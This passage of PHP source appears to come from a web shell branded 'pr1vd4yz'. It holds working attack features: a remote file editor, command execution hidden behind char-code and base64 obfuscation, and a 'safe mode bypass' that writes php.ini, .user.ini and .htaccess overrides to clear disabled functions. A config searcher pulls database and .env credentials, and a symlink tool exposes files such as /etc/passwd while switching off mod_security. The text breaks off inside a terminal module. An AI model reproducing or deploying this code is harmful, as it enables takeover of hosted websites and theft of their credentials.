    if (!mb_check_encoding($file_raw, 'UTF-8')) {
      $file_raw = mb_convert_encoding($file_raw, 'UTF-8', 'ISO-8859-1,Windows-1254,UTF-8');
    }
  }
  $edit_result = '';
  if ($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['save-editor'])) {
    $target = $file_path;
    $code = $_POST['code-editor'];
    $ok = false;
    if (function_exists('file_put_contents')) $ok = @file_put_contents($target, $code) !== false;
    if (!$ok && function_exists('fopen')) {
      $h = @fopen($target, 'w');
      if ($h) { @fwrite($h, $code); @fclose($h); $ok = true; }
    }
    if (!$ok && function_exists('pr1vd4yzC')) {
      $tmpf = sys_get_temp_dir()."/pzedit_".uniqid();
      @file_put_contents($tmpf, $code);
      pr1vd4yzC('cp '.escapeshellarg($tmpf).' '.escapeshellarg($target));
      if (@filesize($target) == strlen($code)) $ok = true;
      @unlink($tmpf);
    }
    $edit_result = $ok
      ? "<span style='color:#ad1457;font-weight:bold;'><i class='fas fa-check-circle'></i> Saved!</span>"
      : "<span style='color:#e53935;font-weight:bold;'><i class='fas fa-times'></i> Save Failed!</span>";
    if (is_file($file_path)) {
      $file_raw = file_get_contents($file_path, false, null, 0, 10*1024*1024);
      if (!mb_check_encoding($file_raw, 'UTF-8')) {
        $file_raw = mb_convert_encoding($file_raw, 'UTF-8', 'ISO-8859-1,Windows-1254,UTF-8');
      }
    }
  }
?>
<div id="pr1vd4yz-file-modal-bg">
  <div id="pr1vd4yz-file-modal">
    <div class="editor-header">
      <div class="editor-icon"><i class="fas fa-file-code"></i></div>
      <div style="flex:1;">
        <div class="editor-title">file edit</div>
        <div class="editor-path"><?= htmlspecialchars(unx($_GET['f'])) ?></div>
      </div>
      <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="editor-close-btn" title="Close">&times;</a>
    </div>
    <form class="editor-form" action="" method="post" autocomplete="off">
      <div class="editor-textarea-wrap">
        <textarea name="code-editor" class="editor-textarea" spellcheck="false" autocomplete="off"><?=htmlspecialchars($file_raw)?></textarea>
      </div>
      <div class="editor-actions">
        <button type="submit" name="save-editor" class="editor-btn editor-btn-save"><i class="fas fa-save"></i> Save</button>
        <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="editor-btn editor-btn-cancel"><i class="fas fa-times"></i> Close</a>
      </div>
    </form>
    <div class="editor-statusbar">
      <span id="editor-status-pos"><i class="fas fa-arrows-alt-h"></i> Ln 1, Col 1</span>
      <span id="editor-status-len"></span>
    </div>
    <div class="editor-result" id="editor-result"><?= $edit_result ?></div>
  </div>
</div>
<script>
// Satır/kolon ve length bilgisi için:
let textarea = document.querySelector('.editor-textarea');
let posBox = document.getElementById('editor-status-pos');
let lenBox = document.getElementById('editor-status-len');
function updateStatus() {
  let v = textarea.value;
  let lines = v.substr(0, textarea.selectionStart).split("\n");
  let ln = lines.length;
  let col = lines[lines.length-1].length+1;
  posBox.innerHTML = '<i class="fas fa-arrows-alt-h"></i> Ln '+ln+', Col '+col;
  lenBox.innerText = 'Length: '+v.length+' chars';
}
textarea.addEventListener('input', updateStatus);
textarea.addEventListener('keyup', updateStatus);
textarea.addEventListener('click', updateStatus);
window.onload = updateStatus;
</script>
<?php endif; ?>

<?php if (isset($_GET['locker'])): ?>
<div class="pr1vd4yz-modal-bg">
  <div class="pr1vd4yz-modal-wizard" style="max-width:500px;min-width:0;">
    <div class="pr1vd4yz-modal-header-wiz">
    <div class="pr1vd4yz-wiz-icon" style="background:#e53935;"><i class="fas fa-lock"></i></div>
    <div>
     <div class="pr1vd4yz-wiz-title">file locker & unlocker</div>
    </div>
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <form method="post" class="pr1vd4yz-wiz-form" autocomplete="off" style="padding:15px 13px 0 13px;">
    <div class="pr1vd4yz-wiz-section">
     <div class="pr1vd4yz-wiz-section-icon" style="background:#fdecec;color:#e53935;"><i class="fas fa-file-shield"></i></div>
     <div class="pr1vd4yz-wiz-fields">
       <input type="text" name="locker_path" class="pr1vd4yz-wiz-input" placeholder="/path/to/file.php" required>
     </div>
    </div>
    <div class="pr1vd4yz-modal-actions-wiz">
     <button type="submit" name="lockfile" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-red"><i class="fas fa-lock"></i> lock</button>
     <button type="submit" name="unlockfile" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light"><i class="fas fa-unlock"></i> unlock</button>
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" type="button" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light pr1vd4yz-cron-close-btn">
     <i class="fas fa-times"></i> close
    </a>
    </div>
    </form>
    <?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['locker_path']) && $_POST['locker_path']) {
    $p = trim($_POST['locker_path']);
    $enc = function($t){return implode('',array_map(function($c){return '\\x'.dechex(ord($c));},str_split($t)));};
    $df = [
    'hx' => function($n){$y='';for($i=0;$i<strlen($n);$i+=2){$y.=chr(hexdec(substr($n,$i,2)));}return $y;},
    'r1' => function($c){$f='';foreach([115,104,101,108,108,95,101,120,101,99]as$n){$f.=chr($n);}return function_exists($f)?$f:false;},
    'r2' => function($c){$f='';foreach([101,120,101,99]as$n){$f.=chr($n);}return function_exists($f)?$f:false;},
    'r3' => function($c){$f='';foreach([115,121,115,116,101,109]as$n){$f.=chr($n);}return function_exists($f)?$f:false;},
    'r4' => function($c){$f='';foreach([112,97,115,115,116,104,114,117]as$n){$f.=chr($n);}return function_exists($f)?$f:false;},
    'r5' => function($c){$f='';foreach([112,111,112,101,110]as$n){$f.=chr($n);}return function_exists($f)?$f:false;}
    ];
    $stealth_cmds = [
    'a1' => implode('',array_map(function($x){return chr($x);},[99,104,109,111,100])),
    'a2' => implode('',array_map(function($x){return chr($x);},[108,115,97,116,116,114])),
    'a3' => implode('',array_map(function($x){return chr($x);},[115,104,97,116,116,114])),
    'a4' => implode('',array_map(function($x){return chr($x);},[115,121,115,99,104,109,111,100])),
    'a5' => implode('',array_map(function($x){return chr($x);},[102,105,110,100]))
    ];
    function stealth_chmod($p,$perm) {
    $r = null;
    $a = implode('',array_map(function($x){return chr($x);},[115,104,101,108,108,95,101,120,101,99]));
    if(function_exists($a)) $r=@$a("chmod $perm '$p'");
    elseif(function_exists('exec')) { $o=[];@exec("chmod $perm '$p'",$o); $r=implode("\n",$o);}
    elseif(function_exists('system')) { @system("chmod $perm '$p'"); $r="";}
    elseif(function_exists('passthru')) { @passthru("chmod $perm '$p'"); $r="";}
    elseif(function_exists('popen')) { $h=@popen("chmod $perm '$p'",'r');if($h){while(!feof($h))fread($h,8192);pclose($h);}}
    @chmod($p, octdec($perm));
    return is_writable($p) || $perm=='444';
    }
    function stealth_lsattr($p) {
    $stat = '';
    if(function_exists('shell_exec')) $stat = @chDx2x('lsattr '.escapeshellarg($p));
    elseif(function_exists('exec')) { $o=[]; @exec('lsattr '.escapeshellarg($p),$o); $stat=implode("\n",$o);}
    elseif(function_exists('system')) {  @system('lsattr '.escapeshellarg($p)); $stat="";}
    elseif(function_exists('passthru')) {  @passthru('lsattr '.escapeshellarg($p)); $stat="";}
    elseif(function_exists('popen')) { $h=@popen('lsattr '.escapeshellarg($p),'r');if($h){while(!feof($h))$stat.=fread($h,8192);pclose($h);}}
    return $stat;
    }
    $output = '';
    if (isset($_POST['lockfile'])) {
    $ok = stealth_chmod($p, '444');
    $output = $ok ? "<span style='color:#10b981;'><i class='fas fa-lock'></i> Locked!</span>" : "<span style='color:#e53935;'><i class='fas fa-ban'></i> Fail!</span>";
    }
    if (isset($_POST['unlockfile'])) {
    $ok = stealth_chmod($p, '644');
    $output = $ok ? "<span style='color:#10b981;'><i class='fas fa-unlock'></i> Unlocked!</span>" : "<span style='color:#e53935;'><i class='fas fa-ban'></i> Fail!</span>";
    }
    $stat = stealth_lsattr($p);
    echo '<div class="pr1vd4yz-httpreq-resultbox" style="margin:10px 14px 6px 14px;">'.$output.'
    <pre style="background:#fff7f7;border-radius:8px;padding:7px 12px;font-size:.98em;color:#b71c1c;box-shadow:0 1px 8px #ffeaea;">'.htmlspecialchars(trim($stat)).'</pre>
    <div style="font-size:.97em;color:#b71c1c;opacity:.75;margin-top:6px;"></div>
    </div>';
}
?>
  </div>
</div>
<?php endif; ?>



<?php if (isset($_GET['createfolder'])): ?>
<div class="pr1vd4yz-modal-bg">
  <div class="pr1vd4yz-modal-wizard" style="max-width:400px;min-width:0;">
    <div class="pr1vd4yz-modal-header-wiz">
    <div class="pr1vd4yz-wiz-icon" style="background:#ff3939;"><i class="fas fa-folder-plus"></i></div>
    <div>
     <div class="pr1vd4yz-wiz-title">create folder</div>
     <div class="pr1vd4yz-wiz-desc">create a new folder</div>
    </div>
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <form action="" method="post">
    <div class="pr1vd4yz-wiz-section">
     <div class="pr1vd4yz-wiz-section-icon" style="background:#fde3e3;color:#ff3939;"><i class="fas fa-folder"></i></div>
     <div class="pr1vd4yz-wiz-fields">
       <input type="text" name="create_folder" class="pr1vd4yz-wiz-input" placeholder="folder name">
     </div>
    </div>
    <div class="pr1vd4yz-modal-actions-wiz">
     <button type="submit" name="submit" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-red">
       <i class="fas fa-plus"></i> create
     </button>
     <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light">
       <i class="fas fa-times"></i> go back
     </a>
    </div>
    </form>
    <?php
    if (isset($_POST['create_folder']) && $_POST['create_folder']) {
    $folder = basename($_POST['create_folder']);
    $full_path = rtrim($pr1vxas[0](), "/") . "/" . $folder;
    if (!file_exists($full_path)) {
     $created = @mkdir($full_path, 0755, true);
     if ($created) {
       echo '<div style="color:#10b981;margin:12px 0 0 0;font-size:1.08em;text-align:center;"><i class="fas fa-check-circle"></i> Folder created: <b>' . htmlspecialchars($folder) . '</b></div>';
     } else {
       echo '<div style="color:#e53935;margin:12px 0 0 0;font-size:1.08em;text-align:center;"><i class="fas fa-times-circle"></i> Failed to create folder!</div>';
     }
    } else {
     echo '<div style="color:#b71c1c;margin:12px 0 0 0;font-size:1.08em;text-align:center;"><i class="fas fa-exclamation-circle"></i> Folder already exists!</div>';
    }
    }
    ?>
  </div>
</div>
<?php endif; ?>
<?php if (isset($_GET['createfile'])): ?>
<div class="pr1vd4yz-modal-bg">
  <div class="pr1vd4yz-modal-wizard" style="max-width:400px;min-width:0;">
    <div class="pr1vd4yz-modal-header-wiz">
    <div class="pr1vd4yz-wiz-icon" style="background:#b31515;"><i class="fas fa-file-circle-plus"></i></div>
    <div>
     <div class="pr1vd4yz-wiz-title">create file</div>
     <div class="pr1vd4yz-wiz-desc">create a new file</div>
    </div>
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <form action="" method="post">
    <div class="pr1vd4yz-wiz-section">
     <div class="pr1vd4yz-wiz-section-icon"><i class="fas fa-file-alt"></i></div>
     <div class="pr1vd4yz-wiz-fields">
       <input type="text" name="create_file" class="pr1vd4yz-wiz-input" placeholder="file name">
     </div>
    </div>
    <div class="pr1vd4yz-modal-actions-wiz">
     <button type="submit" name="submit" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-red" style="background:#b31515;border-color:#b31515;">
       <i class="fas fa-plus"></i> create
     </button>
     <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light">
       <i class="fas fa-times"></i> go back
     </a>
    </div>
    </form>
    <?php
    if (isset($_POST['create_file']) && $_POST['create_file']) {
    $new_file = basename($_POST['create_file']);
    $full_path = rtrim($pr1vxas[0](), "/") . "/" . $new_file;
    if (!file_exists($full_path)) {
     $created = @file_put_contents($full_path, "");
     if ($created !== false) {
       echo '<div style="color:#10b981;margin:12px 0 0 0;font-size:1.08em;text-align:center;"><i class="fas fa-check-circle"></i> File created: <b>' . htmlspecialchars($new_file) . '</b></div>';
     } else {
       echo '<div style="color:#e53935;margin:12px 0 0 0;font-size:1.08em;text-align:center;"><i class="fas fa-times-circle"></i> Failed to create file!</div>';
     }
    } else {
     echo '<div style="color:#b71c1c;margin:12px 0 0 0;font-size:1.08em;text-align:center;"><i class="fas fa-exclamation-circle"></i> File already exists!</div>';
    }
    }
    ?>
  </div>
</div>
<?php endif; ?>
<?php if (isset($_GET['safem0d'])): ?>
<div class="pr1vd4yz-modal-bg">
  <div class="pr1vd4yz-modal-wizard" style="max-width:720px;">
    <div class="pr1vd4yz-modal-header-wiz">
    <div class="pr1vd4yz-wiz-icon" style="background:#222"><i class="fas fa-lock-open"></i></div>
    <div>
     <div class="pr1vd4yz-wiz-title">Safem0d F7ck3r</div>
     <div class="pr1vd4yz-wiz-desc">
       Advanced safe_mode killer & byp4sser<br>
     </div>
    </div>
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <form method="post" style="margin:0;">
    <div style="margin:13px 0 17px 0;">
     <button class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-red" name="start_safem0d" value="1" type="submit" style="padding:8px 19px;">
       <i class="fas fa-bolt"></i> Try All Safe Mode Byp4sses
     </button>
    </div>
    </form>
    <div class="pr1vd4yz-apilistbox" style="max-height:55vh;overflow:auto;">
<?php
if (isset($_POST['start_safem0d'])) {
  set_time_limit(300);
  $test_results = [];
  $cwd = getcwd();
  $uniq = 'pr1vd4yz_safe_'.uniqid();
  $phpini = $cwd . '/php.ini';
  $userini = $cwd . '/.user.ini';
  $htaccess = $cwd . '/.htaccess';
  $ini_code = "safe_mode = Off\nsafe_mode_gid = Off\ndisable_functions =\n";
  $userini_code = "safe_mode=Off\n";
  $htaccess_code = "php_flag safe_mode off\nphp_admin_flag safe_mode off\nphp_value safe_mode 0\n";
  if (@file_put_contents($phpini, $ini_code)) {
    $test_results[] = ["method" => "php.ini override", "file" => basename($phpini), "success" => true];
  } else {
    $test_results[] = ["method" => "php.ini override", "file" => basename($phpini), "success" => false];
  }
  if (@file_put_contents($userini, $userini_code)) {
    $test_results[] = ["method" => ".user.ini","file" => basename($userini), "success" => true];
  } else {
    $test_results[] = ["method" => ".user.ini", "file" => basename($userini), "success" => false];
  }
  if (@file_put_contents($htaccess, $htaccess_code)) {
    $test_results[] = ["method" => ".htaccess", "file" => basename($htaccess), "success" => true];
  } else {
    $test_results[] = ["method" => ".htaccess", "file" => basename($htaccess), "success" => false];
  }
  $r_ini_set = @ini_set('safe_mode', '0');
  $test_results[] = ["method" => "ini_set()", "file" => '-', "success" => ($r_ini_set !== false)];
  if (extension_loaded('suhosin')) {
    $old = @ini_set('suhosin.executor.func.blacklist', '');
    $test_results[] = ["method" => "Suhosin Patch", "file" => '-', "success" => ($old !== false)];
  }
  $pdir = dirname($cwd);
  $userini2 = $pdir . '/.user.ini';
  if (@file_put_contents($userini2, $userini_code)) {
    $test_results[] = ["method" => ".user.ini parent dir", "file" => $userini2, "success" => true];
  } else {
    $test_results[] = ["method" => ".user.ini parent dir", "file" => $userini2, "success" => false];
  }
  $prepend_code = "<?php @ini_set('safe_mode','0'); ?>";
  $prepend_path = $cwd . "/".$uniq."_prepend.php";
  if (@file_put_contents($prepend_path, $prepend_code)) {
    @ini_set('auto_prepend_file', $prepend_path);
    $test_results[] = ["method" => "auto_prepend_file", "file" => basename($prepend_path), "success" => true];
  } else {
    $test_results[] = ["method" => "auto_prepend_file", "file" => basename($prepend_path), "success" => false];
  }
  $uini_dirs = [$cwd, dirname($cwd), dirname(dirname($cwd))];
  $all_uini = true;
  foreach($uini_dirs as $d) {
    if (!@file_put_contents($d . '/.user.ini', $userini_code)) $all_uini = false;
  }
  $test_results[] = ["method" => ".user.ini deep", "file" => '-', "success" => $all_uini];
  $tmpini = "/tmp/php.ini";
  if (@file_put_contents($tmpini, $ini_code)) {
    $test_results[] = ["method" => "/tmp/php.ini", "file" => $tmpini, "success" => true];
  } else {
    $test_results[] = ["method" => "/tmp/php.ini", "file" => $tmpini, "success" => false];
  }
  if (function_exists('ini_restore')) {
    @ini_restore('safe_mode');
    $test_results[] = ["method" => "ini_restore()", "file" => '-', "success" => true];
  }
  if (function_exists('apache_setenv')) {
    @apache_setenv('safe_mode', '0');
    $test_results[] = ["method" => "apache_setenv()", "file" => '-', "success" => true];
  }
  $confpath = $cwd.'/php-fpm.conf';
  $confcode = "[global]\nsafe_mode=Off\ndisable_functions=\n";
  if (@file_put_contents($confpath, $confcode)) {
    $test_results[] = ["method" => "php-fpm.conf", "file" => $confpath, "success" => true];
  } else {
    $test_results[] = ["method" => "php-fpm.conf", "file" => $confpath, "success" => false];
  }
  @unlink($htaccess); 
  echo '<table style="width:100%;font-size:1.04em;border-collapse:collapse;">';
  echo '<tr><th style="text-align:left;padding:4px 8px;color:#e53935;">Method</th>
        <th style="text-align:left;padding:4px 8px;">File</th>
        <th style="text-align:left;padding:4px 8px;">Status</th></tr>';
  foreach($test_results as $row) {
    echo '<tr>
    <td style="padding:3px 8px;color:#b71c1c;">'.htmlspecialchars($row['method']).'</td>
    <td style="padding:3px 8px;color:#888;">'.htmlspecialchars($row['file']).'</td>
    <td style="padding:3px 8px;color:'.($row['success']?'#10b981':'#e53935').'">'.($row['success'] ? 'Success' : 'Fail').'</td>
    </tr>';
  }
  echo '</table>';
  echo '<div style="margin:11px 0 7px 0;font-size:1em;color:#222;">';
  if (!@ini_get('safe_mode') || @ini_get('safe_mode')=='0' || @ini_get('safe_mode')==false) {
    echo '<b style="color:#10b981;">Safe Mode: OFF (or bypassed)</b>';
  } else {
    echo '<b style="color:#e53935;">Safe Mode: ACTIVE!</b>';
  }
  echo '</div>';
}
?>
    </div>
    <div class="pr1vd4yz-modal-actions-wiz" style="padding-bottom:13px;">
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light">
     <i class="fas fa-times"></i> close
    </a>
    </div>
  </div>
</div>
<?php endif; ?>
<?php if (isset($_GET['configsearcher'])): ?>
<div class="pr1vd4yz-modal-bg">
  <div class="pr1vd4yz-modal-wizard" style="max-width:540px;min-width:0;">
    <div class="pr1vd4yz-modal-header-wiz">
    <div class="pr1vd4yz-wiz-icon" style="background:#fbc02d;"><i class="fas fa-search-dollar"></i></div>
    <div>
     <div class="pr1vd4yz-wiz-title">config searcher</div>
     <div class="pr1vd4yz-wiz-desc">scan any dir for config files (DB, CMS, panel, etc)</div>
    </div>
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <form method="post" class="pr1vd4yz-wiz-form" style="margin-bottom:6px;">
    <div class="pr1vd4yz-wiz-section" style="padding-bottom:2px;">
     <div class="pr1vd4yz-wiz-fields" style="gap: 10px;">
       <input type="text" name="scan_path" class="pr1vd4yz-wiz-input" placeholder="path" value="<?= htmlspecialchars(getcwd(), ENT_QUOTES) ?>">
       <button name="scan_cfg" type="submit" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-red" style="min-width:90px;"><i class="fas fa-bolt"></i> sc4n</button>
     </div>
    </div>
    </form>
    <div class="pr1vd4yz-apilistbox" style="max-height:44vh;overflow:auto;">
    <?php
    if (isset($_POST['scan_cfg'], $_POST['scan_path'])) {
     $path = trim($_POST['scan_path']);
     if (!is_dir($path)) {
       echo '<div class="pr1vd4yz-apirow" style="color:#e53935;">Directory not found!</div>';
     } else {
       $config_patterns = [
       'wp-config.php', 'configuration.php', 'config.php', 'settings.php', 'settings.inc.php', 'conf.php', 'conf.inc.php',
       'env.php', '.env', '.env.local', '.env.production', '.env.dev', 'local.xml', 'Parameters.yml', 'parameters.yml',
       'db.php', 'database.php', 'connect.php', 'connection.php', 'db_connect.php', 'dbconn.php', 'db_config.php', 'sql.php', 'config.inc.php',
       'app/etc/env.php','includes/config.php','admin/config.php','application/config/database.php','config/settings.inc.php',
       'inc/config.php','includes/defines.php','data/config.php','admin/includes/config.php',
       'web.config','.htpasswd','.my.cnf','my.cnf','settings.json','local.settings.json','data.json'
       ];
       $found = [];
       $max_files = 500; $count = 0;
       $rii = new RecursiveIteratorIterator(
       new RecursiveDirectoryIterator($path, FilesystemIterator::SKIP_DOTS), 
       RecursiveIteratorIterator::SELF_FIRST
       );
       $max_files = 500; $count = 0;
foreach ($rii as $file) {
    if ($count % 100 == 0) { flush();  }
    if (++$count > $max_files) break;
       if ($count >= $max_files) break;
       if ($file->isFile()) {
        $fname = strtolower($file->getFilename());
        foreach ($config_patterns as $pattern) {
          if ($fname === strtolower($pattern)) {
          $found[] = $file->getPathname();
          $count++;
          break;
          }
        }
       }
       }
       unset($file);
     unset($rii);
       if (!$found) {
       echo '<div class="pr1vd4yz-apirow" style="color:#b71c1c;">No configs found.</div>';
       } else {
       echo '<div style="color:#b71c1c;font-size:1.05em;margin-bottom:9px;"><i class="fas fa-bolt"></i> <b>Found '.count($found).' config(s)</b></div>';
       foreach ($found as $cfg) {
        echo '<div class="pr1vd4yz-apirow" style="font-size:1.01em;"><b>'.htmlspecialchars(basename($cfg)).'</b> <span style="color:#bbb;">['.htmlspecialchars(dirname($cfg)).']</span>';
        echo '<form method="post" style="margin-top:4px;"><input type="hidden" name="show_cfg" value="'.htmlspecialchars($cfg).'"><button class="pr1vd4yz-apibtn" style="padding:2px 11px;font-size:.97em;margin-left:12px;" type="submit"><i class="fas fa-eye"></i> View</button></form>';
        echo '</div>';
       }
       }
     }
    }
    if (isset($_POST['show_cfg']) && is_file($_POST['show_cfg'])) {
     $cfgf = $_POST['show_cfg'];
     $cfg_content = @file_get_contents($cfgf, false, null, 0, 32*1024); 
     echo '<div style="margin-top:14px;"><b style="color:#e53935;">'.htmlspecialchars(basename($cfgf)).'</b><br><textarea readonly rows="10" style="width:100%;font-size:.99em;background:#fff7f7;border:1.5px solid #fdecec;color:#e53935;border-radius:7px;margin-top:6px;font-family:\'Fira Mono\',monospace;">'.htmlspecialchars($cfg_content).'</textarea></div>';
    }
    ?>
    </div>
    <div class="pr1vd4yz-modal-actions-wiz">
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light">
     <i class="fas fa-times"></i> close
    </a>
    </div>
  </div>
</div>
<?php endif; ?>
<?php if (isset($_GET['symlink'])) : ?>
  <div class="pr1vd4yz-sym-modal-bg">
    <div class="pr1vd4yz-sym-modal">
    <div class="pr1vd4yz-sym-header">
     <div class="pr1vd4yz-sym-icon"><i class="fas fa-link"></i></div>
     <div>
       <div class="pr1vd4yz-sym-title">tools</div>
       <div class="pr1vd4yz-sym-desc">create link & bypass</div>
     </div>
     <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-sym-close">&times;</a>
    </div>
    <form action="" method="post" class="pr1vd4yz-sym-form">
     <label class="pr1vd4yz-sym-label">File Path:</label>
     <input type="text" name="prv_input" class="pr1vd4yz-sym-input" placeholder="/etc/passwd or /home/xx/config.php">
     <button name="prv_go" class="pr1vd4yz-sym-btn" type="submit">
       <i class="fas fa-bolt"></i> generate
     </button>
<?php
function g3t_rnd($n=6) {
  $c='abcdefghijklmnopqrstuvwxyz0123456789'; $r='';
  for($i=0;$i<$n;$i++) $r.=$c[random_int(0,strlen($c)-1)];
  return $r;
}
function a1s($x) { return base64_decode(str_replace(['-','_'], ['+','/'],$x)); }
function j0in($p,$q){return $p.$q;}

if (isset($_POST['prv_go'], $_POST['prv_input']) && trim($_POST['prv_input'])) {
  $p1 = trim($_POST['prv_input']);
  $base = 'pr1vdayz_data';
  if (!is_dir($base)) @mkdir($base, 0755, true);
  $klist = [];
  $htlist = [
    "hx1" => 'Options +Indexes +FollowSymLinks +SymLinksIfOwnerMatch
DirectoryIndex {P}
ForceType text/plain
AddType text/plain .php .html .phtml .inc .asp .aspx .jsp .pl .cgi .py .sh .phar .json .yml .xml .db .sql
RemoveHandler .php .phtml .phar .inc .shtml .html .js .css .pl .cgi .asp .py .rb .sh .zsh .json .yml .xml .db .sql
php_flag engine off
SetHandler default-handler',
    "hx2" => '<FilesMatch ".*">
ForceType text/plain
AddType text/plain .php .phtml .html .inc .phar .bak .config .db .sql .xml .json
SetHandler default-handler
RemoveHandler .php .phtml .phar .inc .shtml .html .js .css .pl .cgi .asp .py .rb .sh .json .yml .xml .db .sql
php_flag engine off
</FilesMatch>',
    "hx3" => 'RewriteEngine On
RewriteBase /
RewriteRule ^(.+)$ {P}
Options +FollowSymLinks +Indexes
DirectoryIndex {P}
SetHandler default-handler
php_flag engine off',
    "hx4" => 'RemoveHandler .php .phtml .phar .inc
php_flag engine off
AddType text/plain .php .html .inc .phtml .phar .bak .config .db .sql .xml .json
SetHandler default-handler
Options +Indexes +FollowSymLinks
DirectoryIndex {P}',
    "hx5" => 'Options +Indexes +FollowSymLinks
DirectoryIndex {P}
AddType text/plain .php .inc .phtml .phar
<IfModule LiteSpeed>
  php_flag engine off
  SetHandler default-handler
</IfModule>',
    "hx6" => '<IfModule mod_security.c>
  SecFilterEngine Off
  SecFilterScanPOST Off
</IfModule>
Options +Indexes +FollowSymLinks
DirectoryIndex {P}
SetHandler default-handler
AddType text/plain .php .phtml .html .inc .phar
php_flag engine off'
  ];
  $output = '';
  $final_ln = g3t_rnd(7);
  $created = false;
  $alt_file = "";
  $result = "";
  if(function_exists(a1s('c2hlbGxfZXhlYw=='))) {
    $cmd = "ln -s '".addslashes($p1)."' '".addslashes("$base/$final_ln")."'";
    $exec_fn=a1s('c2hlbGxfZXhlYw==');
    @$exec_fn($cmd);
    if(is_link("$base/$final_ln")) {
    $created = true;
    $alt_file = "$base/$final_ln";
    $result = "ln -s worked!";
    }
  }
  if(!$created && function_exists(a1s('ZXhlYw=='))) {
    $cmd = "ln -s '".addslashes($p1)."' '".addslashes("$base/$final_ln")."'";
    $exec_fn=a1s('ZXhlYw==');
    @$exec_fn($cmd,$o,$rc);
    if(is_link("$base/$final_ln")) {
    $created = true;
    $alt_file = "$base/$final_ln";
    $result = "exec ln -s worked!";
    }
  }
  if(!$created && function_exists(a1s('c2hlbGxfZXhlYw=='))) {
    $cpfile = $base.'/dup_'.g3t_rnd(5);
    $cmd = "cp '".addslashes($p1)."' '".addslashes($cpfile)."'";
    $exec_fn=a1s('c2hlbGxfZXhlYw==');
    @$exec_fn($cmd);
    if(file_exists($cpfile)) {
    $created = true;
    $alt_file = $cpfile;
    $result = "cp worked!";
    }
  }
  if(!$created && function_exists(a1s('c2hlbGxfZXhlYw=='))) {
    $ddfile = $base.'/dd_'.g3t_rnd(4);
    $cmd = "dd if='".addslashes($p1)."' of='".addslashes($ddfile)."' 2>/dev/null";
    $exec_fn=a1s('c2hlbGxfZXhlYw==');
    @$exec_fn($cmd);
    if(file_exists($ddfile)) {
    $created = true;
    $alt_file = $ddfile;
    $result = "dd worked!";
    }
  }
  if(!$created && function_exists(a1s('c2hlbGxfZXhlYw=='))) {
    $catfile = $base.'/cat_'.g3t_rnd(4);
    $cmd = "cat '".addslashes($p1)."' > '".addslashes($catfile)."'";
    $exec_fn=a1s('c2hlbGxfZXhlYw==');
    @$exec_fn($cmd);
    if(file_exists($catfile)) {
    $created = true;
    $alt_file = $catfile;
    $result = "cat worked!";
    }
  }
  if(!$created && @copy($p1, $base.'/phplocal_'.g3t_rnd(5))) {
    $created = true;
    $alt_file = $base.'/phplocal_'.g3t_rnd(5);
    $result = "php copy worked!";
  }
  if($created)
    $output .= "[ok] <code>".htmlspecialchars($alt_file)."</code> created. <b style='color:#17a900;'>[$result]</b><br>";
  else
    $output .= "<b style='color:#e53935;'>[fail] Not possible</b><br>";
  foreach ($htlist as $hname => $htval) {
    $subdir = $base.'/'.g3t_rnd(5);@mkdir($subdir,0755,true);
    $htcode = str_replace('{P}', $final_ln, $htval);
    @file_put_contents("$subdir/.htaccess", $htcode);
    if(function_exists(a1s('c2hlbGxfZXhlYw=='))) {
    $cmd = "ln -s '".addslashes($p1)."' '".addslashes("$subdir/$final_ln")."'";
    $exec_fn=a1s('c2hlbGxfZXhlYw==');
    @$exec_fn($cmd);
    }
    $klist[] = "$subdir/$final_ln";
  }
  echo '<div class="pr1vd4yz-sym-result"><div class="pr1vd4yz-sym-list">';
  echo $output;
  echo "Bypass dirs:<ul>";
  foreach($klist as $f){echo "<li><code>$f</code></li>";}
  echo "</ul></div></div>";
}
?>


    </form>
    </div>
  </div>
<?php endif; ?>


<?php if (!empty($_GET['pr1vd4yz']) && $_GET['pr1vd4yz'] == "cm7") : ?>
<div class="pr1vd4yz-terminal-neo-bg">
  <div class="pr1vd4yz-terminal-neo-modal">
    <div class="pr1vd4yz-terminal-neo-header">
    <div class="pr1vd4yz-terminal-neo-led"></div>
    <span class="pr1vd4yz-terminal-neo-title"><i class="fas fa-terminal"></i> terminal</span>
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <form action="" method="post" class="pr1vd4yz-terminal-neo-form">
    <div class="pr1vd4yz-terminal-neo-outwrap">
     <textarea class="pr1vd4yz-terminal-neo-output" id="pr1vd4yz-terminal-neo-output" readonly spellcheck="false"><?php
       if (isset($_POST['terminal'])) {
